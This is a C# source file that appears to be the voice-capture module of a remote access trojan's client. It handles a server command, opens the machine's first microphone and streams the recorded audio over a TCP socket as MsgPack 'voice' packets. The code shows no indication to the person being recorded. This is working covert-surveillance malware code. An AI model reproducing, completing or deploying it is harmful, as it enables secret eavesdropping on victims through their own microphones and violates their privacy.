using System;
using MessagePack;
using WaveLib;

namespace Client.HandlePacket
{
    internal static class HandleVoice
    {
        private static bool _isRun = true;
        private static WinSoundRecord _Recorder;


        public static void OpenAudio(int samplesPerSecond, int bitsPerSample, int channels)
        {
            var inDeviceOpen = 0;
            try
            {
                var waveInDeviceName = WinSound.GetWaveInDeviceNames().Count > 0
                    ? WinSound.GetWaveInDeviceNames()[0]
                    : null;
                if (waveInDeviceName != null)
                {
                    _Recorder = new WinSoundRecord();
                    _Recorder.DataRecorded += Recorder_DataRecorded;
                    _Recorder.Open(waveInDeviceName, samplesPerSecond, bitsPerSample, channels, 1280, 8);
                }
                else
                {
                    inDeviceOpen = 1;
                }
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(ex.Message);
            }
        }

        private static void Recorder_DataRecorded(byte[] bytes)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "voice";
            msgpack.ForcePathObject("Stream").SetAsBytes(bytes);
            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
        }

        public static void Dispose()
        {
            _isRun = false;
            try
            {
                if (_Recorder != null)
                    _Recorder.Stop();
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(ex.Message);
            }
        }
    }
}